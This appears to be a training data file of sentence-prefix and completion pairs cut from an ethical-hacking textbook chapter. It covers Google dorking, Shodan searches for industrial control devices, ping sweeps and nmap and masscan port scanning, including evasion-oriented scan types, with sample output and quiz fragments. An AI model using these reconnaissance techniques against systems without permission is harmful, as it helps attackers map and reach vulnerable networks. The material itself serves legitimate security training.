the program will essentially perform a spider on the,"the program will essentially perform a spider on the remote site , storing the results in the directory provided"
"zipwildcards ( return=none ) : you can define additional options , such as recurse level ( -r < number > ) , separated by blank spacesto","zipwildcards ( return=none ) : you can define additional options , such as recurse level ( -r < number > ) , separated by blank spacesto see the option list , type helpadditional options ( return=none ) : once you have the html , you can do anything you want with it"
"you can make changes , review all the scripts that are included","you can make changes , review all the scripts that are included in the pages , and review the pages as you need to"
organizations have a lot of other technology that can,organizations have a lot of other technology that can generally be mined using a variety of tools and techniques
"technology intelligence ultimately , your goal as an ethical hacker is","technology intelligence ultimately , your goal as an ethical hacker is to identify vulnerabilities within the organiza - tion you are working for"
"while web interfaces are an attractive place to play and look for vulnerabilities , considering how much sensitive","while web interfaces are an attractive place to play and look for vulnerabilities , considering how much sensitive data can be available through web interfaces , it ’ s not the only place to look for vulnerabilities"
"however , you can still make use of web - sites","however , you can still make use of web - sites to continue to explore the bounds of technology within your target company"
"so far , we ’ ve identified job sites and some social networking","so far , we ’ ve identified job sites and some social networking sites in order to gain intelligence about technology in use at a target"
"it will improve the search responses , saving you a lot","it will improve the search responses , saving you a lot of time clicking through pages that aren ’ t especially valuable"
once you know some of the keywords that can be used to really,"once you know some of the keywords that can be used to really narrow your searches , you ’ ll save time and become more efficient"
"in addition to google hacking techniques , there is the google hacking database , which is a collection of","in addition to google hacking techniques , there is the google hacking database , which is a collection of google dorks that have been identified by someone as a way to search for a num - ber of things"
"if you ’ ve been using search engines for a long time , you may be familiar with the","if you ’ ve been using search engines for a long time , you may be familiar with the use of quotation marks and boolean terms to help ensure that you are getting the right strings in your responses"
"you may also want to limit your results to a single filetype ,","you may also want to limit your results to a single filetype , such as a portable document format ( pdf ) file or a spreadsheet"
the google hacking database ( ghdb ) stores search terms in several categories,"the google hacking database ( ghdb ) stores search terms in several categories , including footholds , vulnerable files , error messages , and sensitive directories"
creating these useful search strings requires that you know not only about,creating these useful search strings requires that you know not only about the google hacking keywords but also about what you are looking for
this means that someone would have had to know exactly what,this means that someone would have had to know exactly what would be in a page or url that would include this data
20 google hacking database spending time at the ghdb can provide you,20 google hacking database spending time at the ghdb can provide you with a lot of ammunition for looking for possible issues within your target
"to make sure you are only searching within your target , of course ,","to make sure you are only searching within your target , of course , you would need to add site : and the domain name to your search parameters"
only providing the domain will be another way to catch additional hostnames,only providing the domain will be another way to catch additional hostnames that you may not have been able to get using dns searching
the iot is made up of devices that may have little to,"the iot is made up of devices that may have little to no input or output capabilities , at least from a traditional standpoint"
"if a device can run general applications and also has a keyboard and a screen , such","if a device can run general applications and also has a keyboard and a screen , such as a computer , tablet , or smartphone , it ’ s not part of the iot"
"many other devices , like network-connected ther-mostats , light bulbs , fans ,","many other devices , like network-connected ther-mostats , light bulbs , fans , refrigerators , and a number of other essentially single-purpose devices , are iot devices"
"malware like satori can infect multiple iot devices , and once","malware like satori can infect multiple iot devices , and once infected , those devices can be used to attack other systems"
"the search term is port:20000 source address , which","the search term is port:20000 source address , which identifies distributed network protocol ( dnp ) 3 devices"
the search for dnp3 devices came as a result of clicking a link for,the search for dnp3 devices came as a result of clicking a link for industrial control systems ( icss ) and looking at different protocols that shodan knows about
shodan also associates with ics the factory interface network service (,"shodan also associates with ics the factory interface network service ( fins ) , highway addressable remote transducer protocol , and many others"
21 shodan search for dnp3 one thing you may notice in the statistics is,21 shodan search for dnp3 one thing you may notice in the statistics is the fact that the united states is on top of all countries with these devices
"22 shows some of those results , though it doesn ’ t show","22 shows some of those results , though it doesn ’ t show the map that shodan provides , presumably indicating exactly where the device is located"
22 shodan results shodan is an excellent resource when it,22 shodan results shodan is an excellent resource when it comes to identifying devices that are considered part of the iot
"using searches of the shodan database , you can","using searches of the shodan database , you can identify devices that may exist on the target network"
summary footprinting and reconnaissance are important activities in,summary footprinting and reconnaissance are important activities in an overall methodology when it comes to ethical hacking
"you want to do your work ahead of time so when you get started , you aren ’ t registering a","you want to do your work ahead of time so when you get started , you aren ’ t registering a lot of activity that could get you detected and the next thing you know , you ’ ve been locked out"
"this includes the technology they may be using , since when they hire people , they generally pro-vide","this includes the technology they may be using , since when they hire people , they generally pro-vide job requirements , including technology vendors like microsoft , red hat , cisco , and palo alto networks"
"social engineering is a common attack technique , and this attack","social engineering is a common attack technique , and this attack technique can be more successful if you know how to target individuals"
"additionally , there are sites like linkedin","additionally , there are sites like linkedin that are focused on businesses and business interactions"
not all domains will have this information since,not all domains will have this information since registrars will sometimes hide the details of the registrant
the quickest way to get all of the hosts is to do a,"the quickest way to get all of the hosts is to do a zone transfer , but it would be unlikely for zone transfers to be allowed"
"instead , you may have to resort to something","instead , you may have to resort to something like brute forcing dns requests to guess possible hostnames"
while gathering details about a web server or the technologies used in a website isn ’ t entirely passive,"while gathering details about a web server or the technologies used in a website isn ’ t entirely passive , meaning using third-party sources , making common requests to a web server shouldn ’ t be noticed much"
as long as you aren ’ t sending too many requests all at once or sending,"as long as you aren ’ t sending too many requests all at once or sending something unusual , you ’ ll get lost in the noise of all the other regular requests"
google hacking is a technique you can use to narrow,google hacking is a technique you can use to narrow your search and get results that are focused and relevant
"google hacking is a technique that makes use of keywords like site ,","google hacking is a technique that makes use of keywords like site , inurl , intext , filetype , and link to get very specific results"
one of the most useful will be the site keyword,"one of the most useful will be the site keyword , which means you are searching only within one domain"
if you need help identify-ing search terms that may help,"if you need help identify-ing search terms that may help you identify vulnerabilities , you can use the google hacking database"
people and businesses are often using devices that have a network connection,people and businesses are often using devices that have a network connection but don ’ t have traditional means for users to interact with them
"shodan will provide a lot of details about a device ,","shodan will provide a lot of details about a device , including the ip address and where the ip address is located"
you should be able to narrow down whether the device,you should be able to narrow down whether the device belongs to your target company using a site like shodan
if you were checking on the ip addresses for a company in,"if you were checking on the ip addresses for a company in france , what rir would you be checking with for details ? a"
the dns server where records for a domain belonging,the dns server where records for a domain belonging to an organization or enterprise reside is called the server
what social networking site would be most likely to be useful,"what social networking site would be most likely to be useful in gathering information about a company , including job titles ? a"
what information would you not expect to find in the,what information would you not expect to find in the response to a whois query about an ip address ? a
if you wanted to locate detailed information about a person using either their,"if you wanted to locate detailed information about a person using either their name or a username you have , which website would you use ? a"
if you were looking for detailed financial information on a target company,"if you were looking for detailed financial information on a target company , with what resource would you have the most success ? a"
what financial filing is required for public companies and,what financial filing is required for public companies and would provide you with the annual report ? a
if you were looking up information about a company in new zealand,"if you were looking up information about a company in new zealand , which rir would you be looking in for data ? a"
"of course , if you are working hand in glove , as it were , with the customer ,","of course , if you are working hand in glove , as it were , with the customer , they may have provided you with a lot of the details you would normally have gotten with reconnaissance techniques"
"either way is okay , as long as you are clear up front about what the scope and scale of the engagement is","either way is okay , as long as you are clear up front about what the scope and scale of the engagement is and , once you start directly interacting with sys-tems , you don ’ t move beyond what was agreed to with your target"
"ethics note just a reminder , especially as we start","ethics note just a reminder , especially as we start moving into touching systems , you must get per- mission"
even though we ’ re just talking about scanning and not performing exploits,"even though we ’ re just talking about scanning and not performing exploits , it ’ s entirely possible for a scan to knock over a system"
"on really fragile systems , such as older embedded devices","on really fragile systems , such as older embedded devices , a simple port scan can cause the device to fail"
ensure that you have permission from your target/client and that they,ensure that you have permission from your target/client and that they have an understanding of what may happen once you get started
a port scan is a starting point for identifying,a port scan is a starting point for identifying services and applications that are listening on those ports
keep in mind that the objective is always to identify issues,keep in mind that the objective is always to identify issues on your target network so your client/employer can improve their security posture
just identifying services and applications may not provide you with a lot of information,"just identifying services and applications may not provide you with a lot of information , and what information it does provide can create a lot of work for you"
knowing the appli-cation name and even the version means you need to,knowing the appli-cation name and even the version means you need to start digging into potential vulner-abilities that may exist with that application and service
"vulnerability scanners can make mistakes—on both ends of the spectrum , meaning it","vulnerability scanners can make mistakes—on both ends of the spectrum , meaning it can miss vulnerabilities as well as report ones that really don ’ t exist"
the knowledge and skill of an ethical hacker is impor-tant here—knowing how,the knowledge and skill of an ethical hacker is impor-tant here—knowing how to verify and knowing what is real and what isn ’ t
this means that these technologies can inhibit or deter attempts to,this means that these technologies can inhibit or deter attempts to reach into the network to gather information that you can use later
"your scan attempts may be detected , alerting security and operations staff about","your scan attempts may be detected , alerting security and operations staff about what you are doing , which may mean you just get barred altogether"
this means there may be evasion techniques that need to be employed,this means there may be evasion techniques that need to be employed to make sure you can keep going and don ’ t get blocked
"one way to achieve that , and also to poke at","one way to achieve that , and also to poke at some functionality to identify possible vulnerabilities , is to use packet crafting"
packet crafting means you bypass the operating system and its mechanisms for creating,packet crafting means you bypass the operating system and its mechanisms for creating all the data structures in the right way for transmis-sion over the network
ping sweeps rather than blindly throwing attacks at address spaces you ’ ve identified,"ping sweeps rather than blindly throwing attacks at address spaces you ’ ve identified , you may want to identify systems that are responsive within those address spaces"
responsive means that when network messages are sent to,"responsive means that when network messages are sent to them , they provide an appropriate response to the mes-sages"
as long as you aren ’ t pounding targets with an unusual,"as long as you aren ’ t pounding targets with an unusual number or size of these messages , they may not be noticed"
ping sweeps aren ’ t guaranteed to succeed because there may,ping sweeps aren ’ t guaranteed to succeed because there may be firewall rules that block icmp messages from outside the network
using fping while there are many tools that can perform,"using fping while there are many tools that can perform a ping sweep , one of the common ones is fping"
"the param-eters used with fping are aeg , which means fping shows hosts that are","the param-eters used with fping are aeg , which means fping shows hosts that are alive , show elapsed time , and generate a list of targets from an address block"
"this output is truncated due to length , but without the a , the","this output is truncated due to length , but without the a , the end of the list would be all of the hosts that were flagged as down"
"some of these round-trip times are fairly high , considering it ’ s all on the local network","some of these round-trip times are fairly high , considering it ’ s all on the local network , even if fping is running on a virtual machine , where the host operating system is using wireless"
"while we have a lot of systems indicating responses , that doesn","while we have a lot of systems indicating responses , that doesn ’ t mean those are the only systems that exist on the network"
"a firewall may respond with an icmp host unreachable , just as you see in the","a firewall may respond with an icmp host unreachable , just as you see in the preceding code , or it may simply drop the message , meaning there would be no response"
using megaping another tool that can perform a ping sweep,"using megaping another tool that can perform a ping sweep , as well as several other functions , is megaping"
the ping sweep can be accomplished using the ip scanner tool,"the ping sweep can be accomplished using the ip scanner tool , which you would select from the list on the left-hand side"
"there are check boxes on the right-hand side , however , that can be","there are check boxes on the right-hand side , however , that can be checked even after you have run a scan , and the information will be added"
there are other enumeration utilities you may find useful as,there are other enumeration utilities you may find useful as you are identifying systems and services on your target network
1 megaping ip scanner hands-on activity download a,1 megaping ip scanner hands-on activity download a copy of megaping from the magento software website
just knowing a host is up ( and the information that a host isn,just knowing a host is up ( and the information that a host isn ’ t up may be unreliable ) doesn ’ t tell you a lot
"you may also consider just moving directly to a port scan , especially since port scanners will often do","you may also consider just moving directly to a port scan , especially since port scanners will often do a ping ahead of the port scan to make sure the system is up before bothering to send port probes"
"when an application has net-work service functionality , it binds to a port , meaning it","when an application has net-work service functionality , it binds to a port , meaning it reserves the port and registers the application to get messages that come in on that port"
any communication received by the system addressed to one of the,any communication received by the system addressed to one of the ports gets forwarded to the application that is registered to that port
"remember that ports exist at the transport layer , so applications determine whether","remember that ports exist at the transport layer , so applications determine whether they are going to use udp or tcp as the protocol to listen on"
the reason for mentioning this is that the objective of port scanning is to,the reason for mentioning this is that the objective of port scanning is to identify the software that is bound to the ports that are identified as open
"to accomplish the handshake , tcp makes use of flag settings , which means there","to accomplish the handshake , tcp makes use of flag settings , which means there is a set of bits that are enabled or disabled to set or unset the flags"
"other flags , such as urg , psh , and fin , are used for other purposes , and the","other flags , such as urg , psh , and fin , are used for other purposes , and the rst flag is used to let other systems know to cease communications on the destination port in the received message"
port scanners make use of the known rules in the protocol,port scanners make use of the known rules in the protocol to make determinations about whether a port is open or not
"what happens , though , if we send other messages to open or closed ports ? why would we even do that ,","what happens , though , if we send other messages to open or closed ports ? why would we even do that , considering that we know how open and closed ports respond ? the reason relates to security technologies like fire-walls and intrusion detection systems"
other tcp messages are used to bypass these devices and,other tcp messages are used to bypass these devices and get responses where there otherwise may not be any response
the way the protocol is expected to work is,the way the protocol is expected to work is documented and so network stack implementations adhere to the docu-mentation
"there are some exchanges that are simply not documented , so","there are some exchanges that are simply not documented , so behavior isn ’ t guaranteed because it ’ s not expected"
the operating system ’ s network stack has no role other than to pass,the operating system ’ s network stack has no role other than to pass the message up to the application once the transport layer head-ers have been processed
"the reason is that with no defined response , it ’ s hard to determine whether a lack of","the reason is that with no defined response , it ’ s hard to determine whether a lack of response is because of a closed port or just because the application didn ’ t receive what it expected"
"if there is no response to a probe message , port scanners","if there is no response to a probe message , port scanners don ’ t assume the port is closed because it may not be"
sending multiple messages with delays between them can cause significant udp port,sending multiple messages with delays between them can cause significant udp port scans to take quite a bit more time than a tcp scan
"after all , if it ’ s good enough for carrie-anne moss in the matrix reloaded","after all , if it ’ s good enough for carrie-anne moss in the matrix reloaded and rihanna in ocean ’ s 8 , it should be good enough for me or you"
this is a program that has been around since 1997 and has become so commonly,this is a program that has been around since 1997 and has become so commonly used that other port scanners implement the same command-line parameters because they are so well known
"it isn ’ t just a port scanner , though ; its primary","it isn ’ t just a port scanner , though ; its primary role and other functions are just extensions of the core purpose of nmap"
"the scripting engine , powered by the lua programming language , has modules that scripts","the scripting engine , powered by the lua programming language , has modules that scripts can be built on top of to make the job of probing systems much easier"
tcp scanning as it ’ s the most detailed and complex type of scanning done,"tcp scanning as it ’ s the most detailed and complex type of scanning done , i ’ ll cover the different types of tcp scans that nmap can perform"
"scanning that many ports , especially considering that the vast majority of","scanning that many ports , especially considering that the vast majority of them aren ’ t used by listening applications , is very time-consuming"
"in order to be efficient , nmap will scan only about 1,000 ports by default","in order to be efficient , nmap will scan only about 1,000 ports by default , though you can specify any ports for nmap to scan that you would like"
"if the port is open , it responds with a syn/ack message and nmap will respond to","if the port is open , it responds with a syn/ack message and nmap will respond to that with a rst message , indicating it doesn ’ t want to continue with the connection"
"not shown : 500 closed ports , 495 filtered portsport state service22/tcp open ssh88/tcp open kerberos-sec445/tcp open microsoft-ds548/tcp open afp5900/tcp open vncmac address :","not shown : 500 closed ports , 495 filtered portsport state service22/tcp open ssh88/tcp open kerberos-sec445/tcp open microsoft-ds548/tcp open afp5900/tcp open vncmac address : ac:87 : a3:36 : d6 : aa ( apple ) nmap done : 1 ip address ( 1 host up ) scanned in 3"
69 seconds in order to demonstrate the use of a network block,"69 seconds in order to demonstrate the use of a network block as a target , we can make use of a full connect scan"
"rather than a rst as the response to the syn/ack , nmap will","rather than a rst as the response to the syn/ack , nmap will complete the connection and then tear it down once the connection is complete"
"rather than just defaulting to the 1,000 ports nmap will usually scan , we","rather than just defaulting to the 1,000 ports nmap will usually scan , we ’ re only going to get hosts that have port 80 and 443 open"
port state service80/tcp open url closed url address : 18 : d6,port state service80/tcp open url closed url address : 18 : d6 : c7:7d : f4:8a ( tp-link technologies ) nmap scan report for 192
port state service80/tcp closed url closed url address : c8 : db:26:02,port state service80/tcp closed url closed url address : c8 : db:26:02 : ee : cc ( logitech ) nmap scan report for harmonyhub
port state service80/tcp closed url closed url address : c8,port state service80/tcp closed url closed url address : c8 : db:26:02:89:62 ( logitech ) nmap scan report for myq-d9f
port state service80/tcp open url closed url address : 64:52:99:54:7f : c5 ( the chamberlain group ) two,"port state service80/tcp open url closed url address : 64:52:99:54:7f : c5 ( the chamberlain group ) two things you may note in the output : first , we don ’ t know what the application is"
"of course , we assume it ’ s a web server , but what one ? even if we knew","of course , we assume it ’ s a web server , but what one ? even if we knew what the operating system is , we can ’ t assume which applica-tion is being used as the web server"
nmap looks up the organiza-tionally unique identifier ( oui ) part of,nmap looks up the organiza-tionally unique identifier ( oui ) part of the mac address from a database and presents the result of the lookup
"the reason for that is that the packets being sent have the fin , psh , and urg","the reason for that is that the packets being sent have the fin , psh , and urg flags set , which makes the packet look lit up like a christmas ( or xmas ) tree"
what you will likely notice quickly is that we don ’ t get,"what you will likely notice quickly is that we don ’ t get an indication about open ports here , as we did in the preceding code"
ports that are open don ’ t respond at all because,ports that are open don ’ t respond at all because this is not a legal packet from the perspective of the protocol
"if nmap doesn ’ t get any response , it ’ s not clear whether it ’ s because","if nmap doesn ’ t get any response , it ’ s not clear whether it ’ s because a network device dropped the message or if the system just didn ’ t respond to an illegal message"
not shown : 995 closed portsport state service22/tcp open|filtered ssh88/tcp open|filtered kerberos-sec445/tcp open|filtered microsoft-ds548/tcp open|filtered afp5900/tcp open|filtered vncmac address : ac:87 :,not shown : 995 closed portsport state service22/tcp open|filtered ssh88/tcp open|filtered kerberos-sec445/tcp open|filtered microsoft-ds548/tcp open|filtered afp5900/tcp open|filtered vncmac address : ac:87 : a3:36 : d6 : aa ( apple ) nmap done : 1 ip address ( 1 host up ) scanned in 13
"other scans , such as the null scan where no flags are set","other scans , such as the null scan where no flags are set , will also show results as being open or filtered for the same reason"
the fin scan also uses an unexpected set of flags since the fin,the fin scan also uses an unexpected set of flags since the fin flag should only be sent in cases where there is an established connection
"the expectation is that if a port is closed ,","the expectation is that if a port is closed , the system will respond with an icmp port unreachable message"
since this is on my local network and i don ’ t care,"since this is on my local network and i don ’ t care how fast it transmits , i have the throttle rate set for 4"
2 will show you what these requests look like,"2 will show you what these requests look like after capturing them in wireshark , a packet capturing program"
"we still have the problem , though , of not","we still have the problem , though , of not knowing for sure what applications are running behind these ports"
what nmap does when we run a version scan ( -sv ) is connect to the,"what nmap does when we run a version scan ( -sv ) is connect to the port and , as necessary , issue the correct protocol commands to get the application banner back"
"in the following code listing , you can see not only the protocol , as","in the following code listing , you can see not only the protocol , as you ’ ve seen before , but also the software being used and the version number"
0 ) 88/tcp open kerberos-sec heimdal kerberos ( server time : 2018-07-15 02:51:39z ) 445/tcp,0 ) 88/tcp open kerberos-sec heimdal kerberos ( server time : 2018-07-15 02:51:39z ) 445/tcp open microsoft-ds ? 548/tcp open afp apple afp ( name : billthecat ; protocol 3
"11 ; macmini7,1 ) 5900/tcp open vnc apple remote desktop vncmac address : ac:87 : a3:36 : d6 : aa ( apple","11 ; macmini7,1 ) 5900/tcp open vnc apple remote desktop vncmac address : ac:87 : a3:36 : d6 : aa ( apple ) service info : oss : os x , mac os x ; cpe : cpe : /o : apple : mac_os_x:10"
23 seconds nmap knows the details about the services because,23 seconds nmap knows the details about the services because the application provides the informa - tion when nmap connects
"different applications and protocols will provide different sets of information , which means nmap","different applications and protocols will provide different sets of information , which means nmap has to understand how to speak these protocols to get this information in some cases"
"as an example , with web servers such as apache , the system administrator is","as an example , with web servers such as apache , the system administrator is in charge of how much should be provided in the headers going back to the client"
"apache can provide not only the name of the product , apache , but also the version","apache can provide not only the name of the product , apache , but also the version of the software and the modules that are loaded as well as the versions of the modules"
"the fingerprints contain details about how each operating system behaves , including how the ip identification field","the fingerprints contain details about how each operating system behaves , including how the ip identification field is generated , the initial sequence number , the initial window size , and several other details"
"in order to identify the operating system , nmap has","in order to identify the operating system , nmap has to find at least one open port and one closed port"
"if you provide multiple systems on the command line , nmap","if you provide multiple systems on the command line , nmap will per-form the same scan on each of the systems specified"
not shown : 995 closed portsport state service22/tcp open ssh88/tcp open kerberos-sec445/tcp open microsoft-ds548/tcp open afp5900/tcp open vncmac address,not shown : 995 closed portsport state service22/tcp open ssh88/tcp open kerberos-sec445/tcp open microsoft-ds548/tcp open afp5900/tcp open vncmac address : ac:87 : a3:36 : d6 : aa ( apple ) os details : apple mac os x 10
not shown : 997 closed portsport state service22/tcp open ssh111/tcp open rpcbind3128/tcp open squid-url,not shown : 997 closed portsport state service22/tcp open ssh111/tcp open rpcbind3128/tcp open squid-url address : 70:4d:7b:61:52:6b ( asustek computer ) device type : general purposerunning : linux 3
07 seconds one thing to keep in mind when you do an operating system scan is that,"07 seconds one thing to keep in mind when you do an operating system scan is that nmap relies on fingerprints , and unlike people , the same fingerprint can match multiple operating systems"
the operating system is really the kernel—the piece of software,"the operating system is really the kernel—the piece of software that manages the hardware , manages memory , and manages processes"
all the other stuff that helps the user interact with the operating system,"all the other stuff that helps the user interact with the operating system to do user-useful things is in the operating environment , to help draw distinctions"
"in the case of linux , the same kernel may be used across multiple distributions , but","in the case of linux , the same kernel may be used across multiple distributions , but since the only thing being identified is the kernel , there is no way to know what distribution"
"nmap includes a scripting engine , which allows you , as an nmap","nmap includes a scripting engine , which allows you , as an nmap user , to extend the functionality in any way that you would like"
"the scripting engine is there , but it ’ s not completely","the scripting engine is there , but it ’ s not completely up to you to determine what you want to do with it"
there are hundreds of scripts avail-able with the latest,"there are hundreds of scripts avail-able with the latest version of nmap , and the number continues to grow"
"they are grouped into categories , which currently are auth , broadcast , brute , default , discovery","they are grouped into categories , which currently are auth , broadcast , brute , default , discovery , dos , exploit , external , fuzzer , intrusive , malware , safe , version , and vuln"
"251| description : mdns ( rfc6762 ) to use a script , you have to","251| description : mdns ( rfc6762 ) to use a script , you have to pass the -- script= parameter followed by the name of the script you want to run"
"in addition to using the name of the script , you","in addition to using the name of the script , you can indicate the category , as i did in the preceding code"
"on a windows system , you will find the","on a windows system , you will find the scripts in the program files directory where nmap is installed"
"scripts are written in the lua language , and each file can be","scripts are written in the lua language , and each file can be opened and read , possibly to get details about the function of the script"
if you ’ d rather use nmap to get information about the script,"if you ’ d rather use nmap to get information about the script , you can use –script-help , passing in the name of the script"
"70 ( url ) at 2018-07-21 13:42 mdt url discovery intrusive url attempts to determine whether a web server is protected by an ips ( intrusion prevention system ) ,","70 ( url ) at 2018-07-21 13:42 mdt url discovery intrusive url attempts to determine whether a web server is protected by an ips ( intrusion prevention system ) , ids ( intrusion detection system ) or waf ( web application firewall ) by probing the web server with malicious payloads and detecting changes in the response code and body"
"when you are writing nmap scripts , there are variables","when you are writing nmap scripts , there are variables that get set and one of those is the description"
"additionally , you ’ ll notice there is a section on","additionally , you ’ ll notice there is a section on usage , indicating how the script should be called from nmap"
to do this the script will send a `` good '' request and record,"to do this the script will send a `` good '' request and record the response , afterwards it will match this response against new requests containingmalicious payloads"
"in theory , web applications shouldn ’ t react to maliciousrequests because we are storing the","in theory , web applications shouldn ’ t react to maliciousrequests because we are storing the payloads in a variable that is not used bythe script/file and only waf/ids/ips should react to it"
"if aggro mode is set , the script will try all attack vectors ( more noisy ) ] ] -- -- -","if aggro mode is set , the script will try all attack vectors ( more noisy ) ] ] -- -- - @ usage -- nmap -p80 -- script url < host > -- nmap -p80 -- script url -- script-args= '' url url www"
org -- -- @ output -- port state service -- 80/tcp open url |_url ids/ips/waf detected,"org -- -- @ output -- port state service -- 80/tcp open url |_url ids/ips/waf detected in addition to calling individual scripts , you can have nmap select multiple scripts using wildcards"
"if , for example , you wanted to run all of the scripts related to the server message block (","if , for example , you wanted to run all of the scripts related to the server message block ( smb ) protocol version 2 , you could just indicate that the scripts you want to run are named smb2 *"
this is the port used for the common internet file,"this is the port used for the common internet file system ( cifs ) , which is an implementation of smbv2"
"this is the port that triggered the running of the scripts , meaning that when nmap found the port","this is the port that triggered the running of the scripts , meaning that when nmap found the port to be open , it identified all the scripts that had registered that port and nmap ran those scripts"
"not shown : 500 closed ports , 495 filtered portsport state service22/tcp open ssh88/tcp open kerberos-sec445/tcp open microsoft-ds548/tcp open afp5900/tcp open","not shown : 500 closed ports , 495 filtered portsport state service22/tcp open ssh88/tcp open kerberos-sec445/tcp open microsoft-ds548/tcp open afp5900/tcp open vncmac address : ac:87 : a3:36 : d6 : aa ( apple ) host script results : | smb2-capabilities : | 2"
10 : |_ message signing enabled and required|_smb2-time : protocol negotiation failed ( smb2,10 : |_ message signing enabled and required|_smb2-time : protocol negotiation failed ( smb2 ) nmap done : 1 ip address ( 1 host up ) scanned in 3
"44 seconds as you can see , you can use the","44 seconds as you can see , you can use the nmap scripts to collect a lot of information about differ- ent services"
"out of that 590 , 31 of them are tar- geted specifically at identifying if a server","out of that 590 , 31 of them are tar- geted specifically at identifying if a server is potentially exposed to a vulnerability known with a common vulnerabilities and exposures ( cve ) identifier"
"as another example , there is a script that looks for the decrypting rsa with obsolete and weakened","as another example , there is a script that looks for the decrypting rsa with obsolete and weakened encryption ( drown ) vulner-ability in servers that are running secure sockets layer ( ssl ) version 2"
"if you have some programming experience , you may find that","if you have some programming experience , you may find that extending nmap with your own scripts is a fairly easy process"
"since all of the nse scripts are in plain text , you can use any of them as a","since all of the nse scripts are in plain text , you can use any of them as a starting point or to grab code samples that you can put together to cre - ate your own script"
the scripts can also make programmatic determinations based,the scripts can also make programmatic determinations based on the responses that are pro-vided by the service
"the scripting engine modules not only provide functionality to inter-act with the services , including registering ports with nmap so the script is called when the","the scripting engine modules not only provide functionality to inter-act with the services , including registering ports with nmap so the script is called when the identified port is found to be open , but there are also modules for output that is presented back by nmap when the script is complete"
"zenmap you can use the command line to do all your nmap scans ,","zenmap you can use the command line to do all your nmap scans , but you don ’ t have to if you prefer to use a gui"
"there were attempts to create guis to overlay on top of nmap , and then one year , under google ’ s","there were attempts to create guis to overlay on top of nmap , and then one year , under google ’ s summer of code project , a gui called zenmap was created and it has remained the gui version of nmap for years"
this means that what you do in zenmap runs nmap underneath,this means that what you do in zenmap runs nmap underneath and then the results from nmap are available in the gui
"with zenmap , you don ’ t have to think so much about the type of","with zenmap , you don ’ t have to think so much about the type of scan you are performing in the sense of the list of scan types i mentioned earlier"
"instead of types like syn scan or full connect scan , you will","instead of types like syn scan or full connect scan , you will select from intense scan , quick scan , regular scan , and others"
if you don ’ t want to use any of the ones that are provided in,"if you don ’ t want to use any of the ones that are provided in the interface , you can change the command line to any-thing you want and still run it"
the advantage to using zenmap isn ’ t being able,the advantage to using zenmap isn ’ t being able to select canned scan settings but instead to visualize the output
"if you use the command line , you get a lot of text","if you use the command line , you get a lot of text output , and then you have to extract what you need from that"
you will also get a small icon indicating the operating system,"you will also get a small icon indicating the operating system type , assuming you performed a scan that detected the operating system"
"again , one of the important aspects of doing a port","again , one of the important aspects of doing a port scan is to identify the services and , subsequently , the applications"
"4 , clicking on the services button shows the list","4 , clicking on the services button shows the list of all of the services that were identified in the scan"
selecting one of the services will bring up a list of,selecting one of the services will bring up a list of all of the hosts that were running that service during the scan
"4 , you will see the list of hosts but you will also","4 , you will see the list of hosts but you will also see , in some cases , the application and version running on that host"
this means you can get a baseline of a network and,this means you can get a baseline of a network and then check it again later to see what may have changed
"if you are testing the same network multiple times ,","if you are testing the same network multiple times , being able to get the historic differences will be useful"
"since xml is a text- based format , you could get the differences between two xml files your-self , but it 's easier","since xml is a text- based format , you could get the differences between two xml files your-self , but it 's easier to have a tool that will consume xml and then compare it node by node to get more than just the text differences"
"while i generally prefer to use the command line ,","while i generally prefer to use the command line , there are times when gui tools are just far more useful"
"i ’ d prefer to run scans from the command line ,","i ’ d prefer to run scans from the command line , but the visualization and organizational capabilities of zenmap make it worth using"
"you could run the scan in nmap and save the output in xml format , then open the","you could run the scan in nmap and save the output in xml format , then open the xml fi le in zenmap and get all the goodness that we ’ ve been talking about here"
"masscan have you ever wanted to just port scan the entire internet to identify all of the web servers that respond ? of course ,","masscan have you ever wanted to just port scan the entire internet to identify all of the web servers that respond ? of course , if you were going to do that , you ’ d want to do it fl at out , as fast as you possibly can"
the difference is that it was developed to go as fast as,the difference is that it was developed to go as fast as your system and the network connection you have will allow it to go
since nmap has become the de facto port scanner and people who are inclined to do,"since nmap has become the de facto port scanner and people who are inclined to do port scans know how nmap works , masscan uses the same sorts of command-line parameters as nmap"
you ’ ll also notice that where i left the type of scan off,"you ’ ll also notice that where i left the type of scan off , masscan let me know it had fi lled in the -ss for me"
4 ( url ) at 2018-07-19 02:26:51 gmt -- forced options : -ss -pn -n -- randomize-hosts -v,4 ( url ) at 2018-07-19 02:26:51 gmt -- forced options : -ss -pn -n -- randomize-hosts -v -- send-eth initiating syn stealth scan scanning 256 hosts [ 2 ports/host ] discovered open port 80/tcp on 192
"your mileage will vary here , based on what your target is , how much bandwidth you have","your mileage will vary here , based on what your target is , how much bandwidth you have available , and how fast your system and network interface can generate and send packets to the network"
you may also have noticed that masscan forced the use of -- randomize-hosts,"you may also have noticed that masscan forced the use of -- randomize-hosts , which means that the ip addresses tested would not be in numerical order"
4 ( url ) at 2018-07-19 03:25:51 gmt -- forced options : -ss -pn -n -- randomize-hosts -v,4 ( url ) at 2018-07-19 03:25:51 gmt -- forced options : -ss -pn -n -- randomize-hosts -v -- send-eth initiating syn stealth scanscanning 256 hosts [ 2 ports/host ] discovered open port 80/tcp on 192
1 200 ok\x0d\ x0aconnection : close\x0d\x0acontent-type : text/html\x0d\x0acache-control :,1 200 ok\x0d\ x0aconnection : close\x0d\x0acontent-type : text/html\x0d\x0acache-control : no-cache\x0d\x0aexpires : -1\x0d\x0a\x0d banner on port 80/tcp on 192
"masscan doesn ’ t have the same capabilities as nmap , including a lack of support for","masscan doesn ’ t have the same capabilities as nmap , including a lack of support for additional scan types , such as the unexpected tcp scans like xmas , fin , and ack"
what masscan gets you is the ability to indicate what rate you,what masscan gets you is the ability to indicate what rate you want to scan at and the ability to perform very fast scans
one thing megaping provides us with that we don,one thing megaping provides us with that we don ’ t get with nmap is some preselected port collections
"one of these is hostile ports , which are ports that are commonly misused as well as","one of these is hostile ports , which are ports that are commonly misused as well as ports that may commonly be used by trojan horse pro-grams and other malicious software ( malware )"
you ’ ll see the box in the middle where you can,you ’ ll see the box in the middle where you can add the addresses and then select the ones you want to scan
6 megaping scan reports one thing you may notice when you look,6 megaping scan reports one thing you may notice when you look at the results is that there are common ports listed as being open
this means the ports will be targeted by attackers because compromising,this means the ports will be targeted by attackers because compromising the application behind the port will immediately give the attacker administrative privileges
"another scan type is authorized ports , which will scan","another scan type is authorized ports , which will scan just the range of ports where applications are expected to reside"
"other ports are considered to be ephemeral , meaning they are assigned to","other ports are considered to be ephemeral , meaning they are assigned to client applications as source ports when they start a conversation with a server"
"one thing to note about megaping is that , while it","one thing to note about megaping is that , while it has a load of functional- ity , it is commercial software"
